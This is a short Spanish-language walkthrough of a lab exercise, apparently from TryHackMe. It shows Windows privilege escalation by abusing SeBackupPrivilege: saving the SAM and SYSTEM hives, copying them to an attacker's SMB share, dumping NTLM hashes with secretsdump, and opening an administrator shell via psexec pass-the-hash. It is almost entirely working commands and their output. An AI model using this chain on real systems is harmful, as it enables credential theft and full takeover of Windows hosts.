- Mostrar los privilgios del usuario
```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Windows\system32>
```

- Respaldar las llaves del registro, aprovechando que tenemos el privilegio efectivo de `SeBackupPrivilege`

```
reg save hklm\system \Users\THMBackup\system.hive
reg save hklm\sam \Users\THMBackup\sam.hive
```

- Crear una carpeta en la maquina de la victima smbshare:
```
root@ip-10-10-26-140:~# pwd
/root
root@ip-10-10-26-140:~# mkdir share
root@ip-10-10-26-140:~# python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Copiar ahí los archivos respaldados
```bash
C:\Windows\system32>reg save hklm\sam \Users\THMBackup\sam.hive
The operation completed successfully.

C:\Windows\system32>copy C:\Users\THMBackup\sam.hive \\10.10.26.140\public\
        1 file(s) copied.

C:\Windows\system32>copy C:\Users\THMBackup\system.hive \\10.10.26.140\public\
        1 file(s) copied.

C:\Windows\system32>
```
- Sacarlos hashs
```
root@ip-10-10-26-140:~/share# pwd
/root/share
root@ip-10-10-26-140:~/share# ls
sam.hive  system.hive
root@ip-10-10-26-140:~/share# python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up...
```

- Ejecutamos usando los hashes
```
root@ip-10-10-26-140:~/share# python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.109.95
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.109.95.....
[*] Found writable share ADMIN$
[*] Uploading file YmEXfjSI.exe
[*] Opening SVCManager on 10.10.109.95.....
[*] Creating service TgJW on 10.10.109.95.....
[*] Starting service TgJW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```